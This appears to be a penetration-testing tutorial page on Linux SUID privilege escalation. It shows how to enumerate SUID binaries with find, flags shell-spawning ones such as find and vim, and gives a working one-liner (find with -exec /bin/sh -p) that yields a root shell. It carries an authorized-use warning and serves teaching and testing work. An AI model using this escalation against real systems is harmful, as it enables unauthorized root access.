A **SUID** ("set user ID") binary runs with the privileges of its *owner*, not
the user who launched it. When that owner is `root`, any exploitable behaviour
in the binary can become a root shell. Enumerating SUID binaries is one of the
first things to do after landing on a Linux host.

## Find SUID binaries

The classic one-liner walks the whole filesystem looking for the SUID bit:

```bash title="Enumerate SUID binaries"
find / -perm -4000 2>/dev/null
```

A few notes on what this does:

- `-perm -4000` matches any file whose permission bits *include* the SUID bit
  (`-` means "at least these bits", not "exactly").
- `2>/dev/null` throws away the flood of `Permission denied` errors so the real
  results stand out.

You can widen the net to catch SGID binaries too:

```bash title="SUID + SGID"
find / -perm -6000 -type f 2>/dev/null
```

## Read the output

A normal system has plenty of *expected* SUID binaries — `passwd`, `sudo`,
`mount`, `ping`. The interesting ones are the binaries that **shouldn't** be
SUID, or that are known to be exploitable when they are.

```ansi title="Example results"
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
/usr/bin/vim.basic
```

Both `find` and `vim` in that list are red flags: each can spawn a shell, so as
a root-owned SUID they hand you root.

<Callout type="tip" title="GTFOBins">
  Cross-reference every unexpected binary against
  <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a>.
  It catalogs exactly how each binary can be abused for a SUID privilege
  escalation, shell escape, or file read/write.
</Callout>

## Exploit example

If `find` is SUID root, its `-exec` action runs commands as root:

```bash title="SUID find → root shell"
find . -exec /bin/sh -p \; -quit
```

The `-p` flag tells the shell not to drop the elevated privileges — without it
many shells reset to your real UID.

<Callout type="warning" title="Authorized use only">
  Only run these techniques against systems you own or are explicitly
  authorized to test. Escalating privileges on a system without permission is a
  crime in most jurisdictions.
</Callout>

## Recap

- SUID binaries run as their owner; root-owned ones are escalation targets.
- Enumerate with `find / -perm -4000 2>/dev/null`.
- Triage results against GTFOBins and exploit shell-spawning binaries with `-p`.
